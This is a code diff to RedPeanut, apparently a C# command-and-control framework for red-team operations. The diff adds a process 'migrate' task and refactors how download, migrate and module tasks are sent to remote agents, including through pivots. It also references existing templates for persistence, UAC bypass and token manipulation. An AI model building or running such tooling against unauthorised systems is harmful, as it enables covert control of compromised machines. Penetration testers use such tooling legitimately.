@@ -68,6 +68,7 @@ namespace RedPeanut
         public const string PERSSTARTUP_TEMPLATE = "PersStartup.cs";
         public const string UACTOKEN_TEMPLATE = "TokenManipulation.cs";
         public const string CLRHOOKINSTALL_TEMPLATE = "PersCLRInstall.cs";
+        public const string MIGRATE_TEMPLATE = "RedPeanutMigrate.cs";
         public const string SPAWN_TEMPLATE = "RedPeanutSpawn.cs";
         public const string WORKSPACE_FOLDER = "Workspace";
         public const string PAYLOADS_FOLDER = "Payloads";
@@ -91,7 +92,8 @@ namespace RedPeanut
             UACBypass,
             StandardCommand,
             Persistence,
-            PersistenceCLR
+            PersistenceCLR,
+            Migrate
         }
 
         public static void ShutDown()
@@ -391,60 +393,97 @@ namespace RedPeanut
 
         }
 
-        public static void RunAssemblyBase64(string assembly, string type, string[] args, IAgentInstance agent, string tasktype = null, string destfilename = null)
+        public static void RunAssemblyBase64(string assembly, string type, string[] args, IAgentInstance agent, string tasktype = null, string destfilename = null, string instanceid = null)
         {
-            RunAssemblyBase64(assembly, "Execute", type, args, agent, tasktype, destfilename);
+            RunAssemblyBase64(assembly, "Execute", type, args, agent, tasktype, destfilename,instanceid);
 
         }
 
-        public static void RunAssemblyBase64(string assembly, string method, string type, string[] args, IAgentInstance agent, string tasktype = null, string destfilename = null)
+        public static void RunAssemblyBase64(string assembly, string method, string type, string[] args, IAgentInstance agent, string tasktype = null, string destfilename = null, string instanceid = null)
         {
-            if (tasktype != null)
+            switch(tasktype)
             {
-                FileDownloadConfig modconfig = new FileDownloadConfig
-                {
-                    Assembly = assembly,
-                    Method = method,
-                    Moduleclass = type,
-                    Parameters = args.ToArray<string>(),
-                    FileNameDest = destfilename
-                };
+                case "download":
+                    FileDownloadConfig downloadconfig = new FileDownloadConfig
+                    {
+                        Assembly = assembly,
+                        Method = method,
+                        Moduleclass = type,
+                        Parameters = args.ToArray<string>(),
+                        FileNameDest = destfilename
+                    };
 
-                TaskMsg task = new TaskMsg
-                {
-                    TaskType = "download",
-                    Instanceid = RandomAString(10, new Random()),
-                    DownloadTask = modconfig,
-                    Agentid = agent.AgentId
-                };
+                    TaskMsg downloadtask = new TaskMsg
+                    {
+                        TaskType = "download",
+                        DownloadTask = downloadconfig,
+                        Agentid = agent.AgentId
+                    };
 
-                if (agent.Pivoter != null)
-                    task.AgentPivot = agent.Pivoter.AgentId;
-                agent.SendCommand(task);
+                    if (instanceid == null)
+                        downloadtask.Instanceid = RandomAString(10, new Random());
+                    else
+                        downloadtask.Instanceid = instanceid;
+
+                    if (agent.Pivoter != null)
+                        downloadtask.AgentPivot = agent.Pivoter.AgentId;
+
+                    agent.SendCommand(downloadtask);
+                    break;
+                case "migrate":
+                    ModuleConfig migrateconfig = new ModuleConfig
+                    {
+                        Assembly = assembly,
+                        Method = method,
+                        Moduleclass = type,
+                        Parameters = args.ToArray<string>()
+                    };
+
+                    TaskMsg migratetask = new TaskMsg
+                    {
+                        TaskType = "migrate",
+                        ModuleTask = migrateconfig,
+                        Agentid = agent.AgentId
+                    };
+
+                    if (instanceid == null)
+                        migratetask.Instanceid = RandomAString(10, new Random());
+                    else
+                        migratetask.Instanceid = instanceid;
+
+                    if (agent.Pivoter != null)
+                        migratetask.AgentPivot = agent.Pivoter.AgentId;
+
+                    agent.SendCommand(migratetask);
+                    break;
+                default:
+                    ModuleConfig modconfig = new ModuleConfig
+                    {
+                        Assembly = assembly,
+                        Method = method,
+                        Moduleclass = type,
+                        Parameters = args.ToArray<string>()
+                    };
+
+                    TaskMsg task = new TaskMsg
+                    {
+                        TaskType = "module",
+                        ModuleTask = modconfig,
+                        Agentid = agent.AgentId
+                    };
+
+                    if (instanceid == null)
+                        task.Instanceid = RandomAString(10, new Random());
+                    else
+                        task.Instanceid = instanceid;
+
+                    if (agent.Pivoter != null)
+                        task.AgentPivot = agent.Pivoter.AgentId;
+
+                    agent.SendCommand(task);
+                    break;
             }
-            else
-            {
-                ModuleConfig modconfig = new ModuleConfig
-                {
-                    Assembly = assembly,
-                    Method = method,
-                    Moduleclass = type,
-                    Parameters = args.ToArray<string>()
-                };
-
-                TaskMsg task = new TaskMsg
-                {
-                    TaskType = "module",
-                    Instanceid = RandomAString(10, new Random()),
-                    ModuleTask = modconfig,
-                    Agentid = agent.AgentId
-                };
-
-                if (agent.Pivoter != null)
-                    task.AgentPivot = agent.Pivoter.AgentId;
-                agent.SendCommand(task);
-            }
-
+            
         }
 
         public static void RunAssembly(string resname, string type, string[] args, IAgentInstance agent)
